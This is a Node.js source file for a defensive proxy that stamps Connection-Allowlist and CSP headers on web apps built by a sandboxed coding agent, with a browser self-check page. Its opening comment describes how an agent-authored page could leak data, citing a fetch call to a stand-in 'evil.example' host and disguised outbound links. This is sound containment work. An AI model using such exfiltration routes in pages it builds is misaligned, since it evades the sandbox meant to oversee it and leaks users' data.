// Hardened viewer proxy — the ONE door for looking at agent-built web apps.
//
// The sandbox blocks the agent's EGRESS, but the agent can still bind dev servers on
// localhost, and you view them from other devices via `tailscale serve`. That view is
// itself an exfiltration surface: a page the agent authored runs in YOUR browser,
// outside every sandbox rule — it can fetch("https://evil.example/?data=…") the moment
// you open it, or dress up a link that navigates you somewhere else with data packed in
// the URL. This proxy sits between `tailscale serve` and the agent's port and stamps
// every response with headers that make your browser the last sandbox wall:
//
//   Connection-Allowlist: (response-origin)
//     Chrome's connection allowlist (origin trial Chrome 148–151, shipping in 152):
//     the browser blocks EVERY connection the page initiates — subresource fetches,
//     link navigations, redirects, WebSocket/WebRTC/WebTransport, prefetch/preload —
//     unless the destination matches the list. `response-origin` means "only the
//     origin this response came from": the app can talk to itself and nothing else.
//   Origin-Trial: <token(s)>
//     Enables the trial for your origin(s) before Chrome 152 ships it by default.
//     Tokens live in ~/.escape-clause/secrets/origin-trial-tokens (one per line) —
//     see store.mjs; without the file the header is simply omitted.
//   Content-Security-Policy
//     The widely-supported fallback: the same same-origin-only posture for fetches,
//     subresources, and form posts in EVERY browser. CSP cannot block a plain <a>
//     click to another origin — that gap is exactly what Connection-Allowlist closes.
//
// Anything the upstream (agent-controlled) server says about these headers is STRIPPED
// before ours are set — the page cannot loosen the policy it is served under. The
// proxy binds loopback only; expose it with e.g.
// `tailscale serve --bg --https=8443 8793` and browse the app ONLY through it — never
// `tailscale serve` an agent port directly.
import { createServer, request } from 'node:http'
import { connect } from 'node:net'
import { writeFileSync } from 'node:fs'
import { join } from 'node:path'
import { DIR, originTrialTokens } from './store.mjs'

// Headers the upstream never gets to speak on: the security set we own (first block)
// and hop-by-hop headers that must not be blindly copied through (second block).
const STRIP = new Set([
  'connection-allowlist', 'connection-allowlist-report-only',
  'content-security-policy', 'content-security-policy-report-only',
  'origin-trial', 'report-to', 'reporting-endpoints', 'refresh',
  'connection', 'keep-alive', 'proxy-connection', 'transfer-encoding', 'upgrade', 'te', 'trailer',
])

export function startViewer({ basePort, appPorts, allowOrigins, log }) {
  // allowOrigins (ESCAPE_CLAUSE_VIEWER_ALLOW) punches deliberate holes: each origin is
  // added to the allowlist as an URL pattern and to the CSP source lists.
  const origins = allowOrigins.map((o) => o.replace(/\/+$/, ''))
  const allowlist = `(${[...origins.map((o) => `"${o}/*"`), 'response-origin'].join(' ')})`
  const csp =
    `default-src 'self' 'unsafe-inline' 'unsafe-eval' data: blob:${origins.length ? ' ' + origins.join(' ') : ''}; ` +
    `object-src 'none'; base-uri 'self'; form-action 'self'; frame-ancestors 'self'`
  const enforced = () => {
    const h = {
      'connection-allowlist': allowlist,
      'content-security-policy': csp,
      'referrer-policy': 'no-referrer',
      'x-content-type-options': 'nosniff',
    }
    const tokens = originTrialTokens() // read per request: paste a token, no restart
    if (tokens.length) h['origin-trial'] = tokens
    return h
  }

  // Publish the viewer ports to the protected store: the seeded `tailscale-serve`
  // policy (policies.mjs) refuses to serve any port not on this list, and the list
  // must come from the broker, not from the agent's arguments.
  writeFileSync(join(DIR, 'viewer-ports'), appPorts.map((_, i) => `${basePort + i}\n`).join(''))

  // Violation reports received from browsers on the self-check page (below): a small
  // in-memory ring, shared across listeners, served back to the page so it can prove
  // Connection-Allowlist is ACTIVELY enforcing (not just present in a header).
  const reports = []

  appPorts.forEach((appPort, i) => {
    const port = basePort + i
    const server = createServer((req, res) => {
      // Self-check routes are answered by the viewer itself — they must work (and be
      // trustworthy) even when no agent app is running on the upstream port.
      if (req.url === CHECK || req.url.startsWith(CHECK + '/') || req.url.startsWith(CHECK + '?')) {
        handleCheck(req, res, { appPort, port, allowlist, enforced, csp, reports })
        return
      }
      const up = request({
        host: '127.0.0.1', port: appPort, method: req.method, path: req.url,
        // Host is rewritten so dev servers with host allowlists (vite & co) answer.
        headers: { ...req.headers, host: `127.0.0.1:${appPort}` },
      }, (ur) => {
        const headers = {}
        for (const [k, v] of Object.entries(ur.headers)) if (!STRIP.has(k)) headers[k] = v
        Object.assign(headers, enforced())
        res.writeHead(ur.statusCode, headers)
        ur.pipe(res)
      })
      up.on('error', (e) => {
        if (res.headersSent) { res.destroy(); return }
        res.writeHead(502, { 'content-type': 'text/plain', ...enforced() })
        res.end(`viewer: nothing answering on 127.0.0.1:${appPort} (${e.code || e.message}) — is the app up?\n`)
      })
      res.on('close', () => up.destroy())
      req.pipe(up)
    })

    // WebSockets (dev HMR and the like): splice bytes both ways. No headers to stamp —
    // a 101 carries no policy; where the PAGE may dial is governed by the document's
    // Connection-Allowlist/CSP set above.
    server.on('upgrade', (req, socket, head) => {
      const up = connect(appPort, '127.0.0.1', () => {
        let raw = `${req.method} ${req.url} HTTP/1.1\r\nhost: 127.0.0.1:${appPort}\r\n`
        for (let j = 0; j < req.rawHeaders.length; j += 2)
          if (req.rawHeaders[j].toLowerCase() !== 'host') raw += `${req.rawHeaders[j]}: ${req.rawHeaders[j + 1]}\r\n`
        up.write(raw + '\r\n')
        if (head?.length) up.write(head)
        socket.pipe(up); up.pipe(socket)
      })
      up.on('error', () => socket.destroy())
      socket.on('error', () => up.destroy())
    })

    // Same posture as the UI and the deny-all proxy: a second session already holding
    // the port serves the same thing; keep this process's MCP side alive.
    server.on('error', (e) => log(`viewer proxy on :${port} failed to start: ${e.message} (MCP tools still up)`))
    server.listen(port, '127.0.0.1', () =>
      log(`viewer proxy on 127.0.0.1:${port} → 127.0.0.1:${appPort} (Connection-Allowlist + CSP enforced; self-check at ${CHECK})`))
  })
}

// ---------- self-check page ----------
// GET /__escape-clause-check__ on any viewer port: verify FROM THE BROWSER'S SIDE that
// the protections hold BEFORE opening an agent app. Served by the viewer itself (never
// proxied), with the SAME header set an agent app would get — so what this page
// measures is exactly the posture apps run under. The checks, layered because no
// single probe covers everything:
//
//   - status endpoint     proves you're going through the viewer at all (a raw agent
//                         port has no such route), and decodes your origin-trial
//                         token(s) so origin/expiry mistakes are visible.
//   - CSP probe (auto)    an <img> to a canary origin + the securitypolicyviolation
//                         event — positive proof the CSP fallback layer enforces.
//                         Works in every browser.
//   - allowlist probe     CSP blocks fetches BEFORE the allowlist ever sees them, so
//     (auto, Chrome)      the probe runs in an iframe whose response alone loosens
//                         connect-src for the canary origin and adds a report-to
//                         param; a violation report arriving back at the viewer is
//                         positive proof Connection-Allowlist itself enforced. The
//                         canary is an RFC 2606 reserved-TLD host, so even a fully
//                         unprotected browser only ever gets NXDOMAIN — nothing real
//                         is contacted.
//   - link test (manual)  the one thing CSP cannot cover and the reason the origin
//                         trial matters: a plain <a> click to another origin. Blocked
//                         = protected; example.com loading = this browser would follow
//                         a disguised link out of an agent app.
const CHECK = '/__escape-clause-check__'
const CANARY = 'https://connection-allowlist-canary.example' // .example never resolves

// Origin-trial tokens: 1 version byte, 64 signature bytes, 4-byte payload length,
// JSON payload {origin, feature, expiry, …}. Decoded (NOT signature-verified — only
// Chrome can do that) so the page can show what a pasted token is actually for.
function decodeOriginTrialToken(token) {
  try {
    const buf = Buffer.from(token, 'base64')
    const len = buf.readUInt32BE(65)
    return { version: buf[0], ...JSON.parse(buf.subarray(69, 69 + len).toString('utf8')) }
  } catch { return { error: 'undecodable — is this a complete origin-trial token?' } }
}

function handleCheck(req, res, { appPort, port, allowlist, enforced, csp, reports }) {
  const path = req.url.split('?')[0]

  if (req.method === 'GET' && path === CHECK) {
    res.writeHead(200, { 'content-type': 'text/html; charset=utf-8', ...enforced() })
    res.end(CHECK_PAGE)
    return
  }
  if (req.method === 'GET' && path === `${CHECK}/status`) {
    res.writeHead(200, { 'content-type': 'application/json', ...enforced() })
    res.end(JSON.stringify({
      viewer: true, viewerPort: port, appPort,
      headers: { 'connection-allowlist': allowlist, 'content-security-policy': csp },
      tokens: originTrialTokens().map(decodeOriginTrialToken),
    }))
    return
  }
  if (req.method === 'GET' && path === `${CHECK}/probe`) {
    // The probe document ONLY: loosen connect-src for the canary (so the fetch gets
    // past CSP and reaches the allowlist) and ask for violation reports. Kept off
    // every other response so agent apps are never served the loosened variant, and a
    // parser quirk in the report-to param could never weaken more than this iframe.
    res.writeHead(200, {
      'content-type': 'text/html; charset=utf-8',
      ...enforced(),
      'connection-allowlist': `${allowlist}; report-to=ec-viewer`,
      'reporting-endpoints': `ec-viewer="${CHECK}/report"`,
      'content-security-policy': `${csp}; connect-src 'self' ${CANARY}`,
    })
    res.end(PROBE_PAGE)
    return
  }
  if (req.method === 'POST' && path === `${CHECK}/report`) {
    let body = ''
    req.on('data', (d) => { body += d; if (body.length > 65536) req.destroy() })
    req.on('end', () => {
      reports.push({ ts: Date.now(), body })
      if (reports.length > 50) reports.shift()
      res.writeHead(204).end()
    })
    return
  }
  if (req.method === 'GET' && path === `${CHECK}/reports`) {
    const fresh = reports.filter((r) => Date.now() - r.ts < 120000)
    res.writeHead(200, { 'content-type': 'application/json', ...enforced() })
    res.end(JSON.stringify(fresh))
    return
  }
  res.writeHead(404, { 'content-type': 'text/plain', ...enforced() }).end('not found\n')
}

// Probe iframe: trigger a connection the loosened CSP permits but the allowlist must
// block, then watch for the browser's violation report to land back at the viewer.
const PROBE_PAGE = `<!doctype html><meta charset="utf-8"><script>
fetch('${CANARY}/probe').catch(function(){})
var t0 = Date.now()
var poll = setInterval(async function(){
  try {
    var rs = await (await fetch('${CHECK}/reports')).json()
    if (rs.some(function(r){ return r.body.indexOf('connection-allowlist-canary.example') !== -1 })) {
      clearInterval(poll); parent.postMessage({ec:'allowlist', ok:true}, location.origin)
    }
  } catch (e) {}
  if (Date.now() - t0 > 60000) { clearInterval(poll); parent.postMessage({ec:'allowlist', ok:false}, location.origin) }
}, 3000)
</script>`

const CHECK_PAGE = `<!doctype html>
<html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<meta name="color-scheme" content="only light">
<title>Escape Clause — viewer self-check</title>
<style>
  body{font:14px/1.5 -apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;margin:0;background:#f4f5f7;color:#1b1e22}
  header{background:#16181c;color:#fff;padding:12px 20px}
  header h1{font-size:15px;margin:0;font-weight:600}
  main{max-width:760px;margin:20px auto 60px;padding:0 16px}
  .card{background:#fff;border:1px solid #dce0e6;border-radius:10px;padding:14px 16px;margin-bottom:12px}
  .card h2{font-size:13px;margin:0 0 6px;display:flex;align-items:center;gap:8px}
  .card p{margin:6px 0;font-size:13px;color:#3d4550}
  .st{font-size:11px;font-weight:700;padding:2px 9px;border-radius:99px;white-space:nowrap}
  .ok{background:#dcf2df;color:#1d7a2e}.bad{background:#fbe3e3;color:#b3261e}
  .warn{background:#fdf1de;color:#9a6b00}.pend{background:#e8ebf0;color:#3d4550}
  code,pre{font-family:ui-monospace,Menlo,monospace;font-size:12px;background:#f0f2f5;border-radius:5px;padding:1px 5px}
  pre{padding:8px 10px;overflow-x:auto;white-space:pre-wrap;word-break:break-all}
  a.testlink{display:inline-block;background:#b3261e;color:#fff;font-weight:600;border-radius:7px;padding:8px 16px;text-decoration:none;margin:6px 0}
  .note{font-size:12px;color:#5b6472}
</style></head>
<body>
<header><h1>Escape Clause — viewer self-check</h1></header>
<main>
<p class="note">This page is served by the <b>viewer proxy itself</b>, with exactly the
headers every agent-built app gets. Run it in each browser you'll use, after any
browser update, and whenever you rotate origin-trial tokens.</p>

<div class="card"><h2><span class="st ok" id="s-viewer">CHECKING</span> You are on the hardened viewer</h2>
<p id="d-viewer">Confirming the viewer's status endpoint answers…</p></div>

<div class="card"><h2><span class="st pend" id="s-browser">CHECKING</span> Browser support for Connection-Allowlist</h2>
<p id="d-browser"></p></div>

<div class="card"><h2><span class="st pend" id="s-token">CHECKING</span> Origin-trial token</h2>
<p id="d-token"></p></div>

<div class="card"><h2><span class="st pend" id="s-csp">CHECKING</span> CSP fallback layer (all browsers)</h2>
<p id="d-csp">Probing with an image request to a canary origin…</p></div>

<div class="card"><h2><span class="st pend" id="s-ca">CHECKING</span> Connection-Allowlist enforcement (automatic)</h2>
<p id="d-ca">A probe frame is fetching a canary origin that only Connection-Allowlist can
block here; waiting for the browser's violation report to arrive back at the viewer
(can take up to a minute — reports are batched)…</p></div>

<div class="card"><h2><span class="st warn">MANUAL</span> The definitive test: a plain link</h2>
<p>CSP cannot stop a page from <i>navigating</i> you to another origin — that is
exactly the gap Connection-Allowlist closes. Click this:</p>
<a class="testlink" href="https://example.com/?escape-clause-viewer-check" target="_blank" rel="noopener">Try to leave — this click should be BLOCKED</a>
<p><b>Protected:</b> the tab shows a browser error (blocked request / can't reach page).<br>
<b>NOT protected:</b> example.com loads — in this browser, a disguised link inside an
agent app <i>would</i> exfiltrate. Fix the token/browser before opening agent apps.</p></div>

<div class="card"><h2>What this page can't check</h2>
<p class="note">That you're on a viewer port and not a raw app port pretending — verify the
URL's port is one of the viewer ports (<span id="d-port">…</span>). And nothing here
covers other browsers/devices: re-run this page wherever you browse agent apps.</p></div>

<script>
function set(id, cls, txt){ var e=document.getElementById('s-'+id); e.className='st '+cls; e.textContent=txt }
function det(id, html){ document.getElementById('d-'+id).innerHTML = html }
function esc(s){ var d=document.createElement('div'); d.textContent=String(s==null?'':s); return d.innerHTML }

// 1. viewer status + 3. token decode
fetch('${CHECK}/status').then(function(r){ return r.json() }).then(function(st){
  set('viewer','ok','OK')
  det('viewer','Viewer on port <code>'+esc(st.viewerPort)+'</code> fronting the agent app on '+
    '<code>127.0.0.1:'+esc(st.appPort)+'</code>. Enforced allowlist: <code>'+esc(st.headers['connection-allowlist'])+'</code>')
  document.getElementById('d-port').textContent = 'this one: ' + st.viewerPort
  if (!st.tokens.length) {
    set('token','warn','NONE')
    det('token','No origin-trial token configured. Before Chrome 152, Connection-Allowlist stays OFF without one: '+
      'register <code>'+esc(location.origin)+'</code> for “Connection Allowlists” at '+
      '<a href="https://developer.chrome.com/origintrials" target="_blank" rel="noopener">the origin trials dashboard</a> '+
      '(open that link from a normal tab — it is blocked from this page, which is the point) and paste the token into '+
      '<code>~/.escape-clause/secrets/origin-trial-tokens</code> on the broker host. No restart needed; reload this page.')
    return
  }
  var h = '', anyGood = false
  st.tokens.forEach(function(t){
    if (t.error) { h += '<pre>'+esc(t.error)+'</pre>'; return }
    var originOk = t.origin && (t.origin.replace(/\\/$/,'') === location.origin)
    var live = t.expiry && t.expiry * 1000 > Date.now()
    if (originOk && live) anyGood = true
    h += '<pre>feature: '+esc(t.feature)+'\\norigin:  '+esc(t.origin)+(originOk ? '  (matches this page)' : '  — DOES NOT match '+esc(location.origin))+
      '\\nexpiry:  '+esc(t.expiry ? new Date(t.expiry*1000).toISOString().slice(0,10) : '?')+(live ? '' : '  — EXPIRED')+'</pre>'
  })
  set('token', anyGood ? 'ok' : 'warn', anyGood ? 'OK' : 'CHECK')
  det('token', h + (anyGood ? '' : 'No token matches this exact origin (scheme, host, AND port) unexpired — Chrome will ignore mismatched tokens.'))
}).catch(function(){
  set('viewer','bad','FAIL')
  det('viewer','<b>The viewer status endpoint did not answer.</b> You may be talking to an agent app directly — close this and use the viewer port.')
})

// 2. browser support (hint only — the probes below are the real evidence)
;(function(){
  var b = (navigator.userAgentData && navigator.userAgentData.brands || []).filter(function(x){ return /chrom/i.test(x.brand) })[0]
  var v = b ? parseInt(b.version, 10) : NaN
  if (!b) { set('browser','warn','CSP ONLY'); det('browser','Not a Chromium browser (or it hides its identity). Connection-Allowlist is a Chrome feature (origin trial 148–151, shipping 152) — here only the CSP layer applies, and the manual link test below will likely NOT be blocked.') }
  else if (v >= 152) { set('browser','ok','OK'); det('browser','Chromium '+v+' — Connection-Allowlist ships by default from 152.') }
  else if (v >= 148) { set('browser','ok','OK'); det('browser','Chromium '+v+' — inside the origin-trial range (148–151); a valid token (below) is required.') }
  else { set('browser','warn','TOO OLD'); det('browser','Chromium '+v+' — Connection-Allowlist needs 148+. Update the browser; until then only the CSP layer applies.') }
})()

// 4. CSP probe: a canary <img> must trigger securitypolicyviolation. The canary TLD
// (.example) never resolves, so even an unprotected browser contacts nothing real.
;(function(){
  var seen = false
  document.addEventListener('securitypolicyviolation', function(e){
    if (!seen && /connection-allowlist-canary/.test(e.blockedURI)) {
      seen = true; set('csp','ok','ENFORCED'); det('csp','The browser blocked the canary request and reported <code>'+esc(e.effectiveDirective)+'</code> — the CSP fallback layer is live.')
    }
  })
  var img = new Image(); img.src = '${CANARY}/px.gif'
  setTimeout(function(){
    if (!seen) { set('csp','bad','NOT SEEN'); det('csp','No CSP violation event fired. If this page came through the viewer that should be impossible — check you are not on a raw app port, and that no other proxy strips headers.') }
  }, 2500)
})()

// 5. allowlist probe (iframe posts back; see /probe for how it isolates the allowlist)
;(function(){
  window.addEventListener('message', function(ev){
    if (ev.origin !== location.origin || !ev.data || ev.data.ec !== 'allowlist') return
    if (ev.data.ok) { set('ca','ok','ENFORCED'); det('ca','The browser filed a Connection-Allowlist violation report for the canary — the allowlist itself is actively enforcing on this origin. You are protected against off-origin fetches <b>and</b> navigations.') }
    else { set('ca','warn','UNCONFIRMED'); det('ca','No violation report arrived within a minute. Either the trial is not active here (no/invalid token, non-Chrome, <148) or this Chrome build does not deliver reports for it yet. <b>Fall back to the manual link test below — it is the ground truth.</b>') }
  })
  var f = document.createElement('iframe'); f.src = '${CHECK}/probe'; f.style.display = 'none'
  document.body.appendChild(f)
})()
</script>
</body></html>`
